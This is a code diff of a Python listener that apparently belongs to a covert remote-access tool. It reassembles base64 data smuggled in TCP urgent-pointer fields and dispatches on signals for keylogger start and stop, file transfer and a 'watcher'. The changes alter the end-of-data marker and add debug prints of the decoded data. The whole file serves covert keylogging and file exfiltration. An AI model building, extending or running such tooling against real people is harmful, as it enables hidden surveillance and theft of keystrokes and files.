@@ -28,7 +28,7 @@ local_ip = get_local_ip()
 source_port = 80
 dest_port = 80
 received_data = ""
-eof_signal = "//"
+eof_signal = "Ly8=Ly8="
 keylogger_start_signal = 1
 keylogger_stop_signal = 2
 file_transfer_signal = 3
@@ -106,9 +106,8 @@ def signal_callback(packet):
             received_data += urgent_pointer_chunk
 
             print(f"Received chunk: {urgent_pointer_chunk}")
-            print(f"Accumulated Data Length: {len(received_data)}")
 
-            # Try to detect EOF in the accumulated data
+            # Try to detect EOF in the accumulated data 
             if eof_signal in received_data:
                 print("EOF signal detected in data.")
                 # Split the data at EOF signal
@@ -118,6 +117,7 @@ def signal_callback(packet):
                         # Remove padding if any
                         clean_data = data_parts[0].rstrip('=')
                         decoded_data = base64.b64decode(clean_data)
+                        print(f"Decoded data received: {decoded_data[:100]}...")  # Print first 100 bytes
                         handle_data(decoded_data)
                     except Exception as e:
                         print(f"Error decoding final data: {e}")
@@ -197,6 +197,7 @@ def prepare_file_transfer():
 def handle_data(decoded_data):
     """Handle the received data based on the current signal."""
     global current_signal
+    print(f"\nFull decoded data:\n{decoded_data}\n")  # Print full decoded data
     if current_signal == file_transfer_signal:
         save_file(decoded_data)
     elif current_signal == watcher_start_signal:
